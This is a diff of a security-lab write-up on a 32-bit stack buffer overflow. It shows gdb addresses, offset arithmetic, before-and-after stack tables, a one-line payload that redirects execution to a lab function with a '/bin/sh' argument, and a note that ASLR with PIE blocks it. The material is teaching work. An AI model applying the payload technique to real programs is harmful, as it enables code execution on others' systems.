@@ -87,44 +87,51 @@ Enjoy your shell!
 crysys@crysys-virtualbox:~/itsec/it-security-lab/lab3-memory-corruption/task-1$ ./app_32 $'AAAAAAAAAAAAAAAA\x86\x91\x04\x08'
 *** stack smashing detected ***: terminated
 Aborted (core dumped)
-crysys@crysys-virtualbox:~/itsec/it-security-lab/lab3-memory-corruption/task-1$ 
-
 
 ## Task-2
 
+`now_called` address: `0x08049186`
+
+`/bin/sh` address: `0x0804a008`
+
+Buffer start: `0xffffcebc`
+
+Return address: `0xffffcecc`
+
+Offset: `0xffffcecc - 0xffffcebc = 0x10` = `16`
+
+### Stack State Analysis
+
+#### Before
+
+| Address | Value (Hex) | Meaning / Content |
+| --- | --- | --- |
+| `0xffffcebc` | `0x00000000` | buffer start |
+| `0xffffcec0` | `0x00000000` | buffer end |
+| `0xffffcec4` | `0x0804bff4` | padding |
+| `0xffffcec8` | `0xffffced8` | saved EBP |
+| `0xffffcecc` | `0x08049216` | original return address |
+
+#### After
+
+| Address | Value (Hex) | Meaning / Content |
+| --- | --- | --- |
+| `0xffffcebc` | `0x41414141` | overwritten buffer |
+| `0xffffcec0` | `0x41414141` | overwritten buffer |
+| `0xffffcec4` | `0x41414141` | overwritten padding |
+| `0xffffcec8` | `0x41414141` | overwritten saved EBP |
+| `0xffffcecc` | `0x08049186` | `now_called` |
+| `0xffffced0` | `0x41414141` | dummy return address |
+| `0xffffced4` | `0x0804a008` | `/bin/sh` argument |
+
+### Exploit
 
 ```bash
-(gdb) print now_called
-$1 = {void (char *)} 0x8049186 <now_called>
-(gdb) find &main, +100000 "/bin/sh"
-A syntax error in expression, near `"/bin/sh"'.
-(gdb) find &main, +100000, "/bin/sh"
-warning: Unable to access 16007 bytes of target memory at 0x80491dd, halting search.
-Pattern not found.
-(gdb) print not_used
-$2 = 0x804a008 "/bin/sh"
-(gdb) 
+./app_32 $'AAAAAAAAAAAAAAAA\x86\x91\x04\x08AAAA\x08\xa0\x04\x08'
 ```
 
-Stack a tamadas elott: 
+### Protection
 
-(gdb) x/24xw $esp
-0xffffcebc:     0x00000000      0x00000000      0x0804bff4      0xffffced8
-0xffffcecc:     0x08049216      0xffffd1bf      0xf7fa0e34      0x00000000
-0xffffcedc:     0xf7d9cc75      0x00000002      0xffffcf94      0xffffcfa0
-0xffffceec:     0xffffcf00      0xf7fa0e34      0x0804909d      0x00000002
-0xffffcefc:     0xffffcf94      0xf7fa0e34      0xffffcfa0      0xf7ffcb60
-0xffffcf0c:     0x00000000      0x9d3d7523      0xd138df33      0x00000000
-(gdb) 
+`make withASLR` still allows the attack if the binary is not PIE, because the code addresses stay fixed.
 
-
-A visszateritesi cim
-
-0xfffcebc + 16 = 0xffffcecc
-
-
-Tamadas:
-./app_32 $'AAAAAAAAAAAAAAAA\x86\x91\x04\x08AAAA\x08\xa0\x04\x08'
-
-
-
+`make withASLRwithPIE` protects against the attack, because function and string addresses change on each run.
